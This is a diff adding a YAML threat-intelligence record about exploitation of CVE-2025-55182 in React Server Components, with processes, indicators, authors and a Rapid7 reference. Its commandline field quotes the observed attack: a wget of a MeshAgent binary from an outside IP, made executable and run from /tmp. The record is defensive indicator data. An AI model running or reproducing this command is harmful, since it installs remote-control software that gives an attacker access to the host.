@@ -1,0 +1,29 @@
+description: Rapid7 observed exploitation attempts of CVE-2025-55182 using a PoC RCE
+  technique, deploying MeshAgent remote control software.
+malware_families:
+- MeshAgent
+TTPs:
+  processes:
+  - wget
+  - meshagent
+  commandline:
+  - '[ "$EUID" -eq 0 ] && URL="https://156.67.221.96/meshagents?id=hrfDDhB%40yNf4oBrCH%40R%24KfVp27XfA78LiX%40IZUxoTgs3zCwG%24bjdpR%400oa8%40BhTf&installflags=0&meshinstall=6"
+    || URL="https://156.67.221.96/meshagents?id=yGNhrz51DRyitgqtVyaSjJU3GsIKSJpCfD5aQ%24QPcbjBXNVeFkiZg1LAmWYOQyP4&installflags=0&meshinstall=6";
+    wget -O /tmp/meshagent --no-check-certificate "$URL" && chmod +x /tmp/meshagent
+    && cd /tmp/ && ([ "$EUID" -eq 0 ] && ./meshagent -install || ./meshagent -connect)'
+  scripting_engine:
+  - bash
+  file_activity:
+  - /tmp/meshagent
+IOCs:
+  ip_addresses:
+  - 156.67.221.96
+  urls:
+  - https://156.67.221.96/meshagents?id=hrfDDhB%40yNf4oBrCH%40R%24KfVp27XfA78LiX%40IZUxoTgs3zCwG%24bjdpR%400oa8%40BhTf&installflags=0&meshinstall=6
+  - https://156.67.221.96/meshagents?id=yGNhrz51DRyitgqtVyaSjJU3GsIKSJpCfD5aQ%24QPcbjBXNVeFkiZg1LAmWYOQyP4&installflags=0&meshinstall=6
+authors:
+- '@maple3142'
+- Lachlan Davidson
+reference: https://www.rapid7.com/blog/post/etr-react2shell-cve-2025-55182-critical-unauthenticated-rce-affecting-react-server-components
+date_of_publication: December 04, 2025
+file_creation_date: December 09, 2025
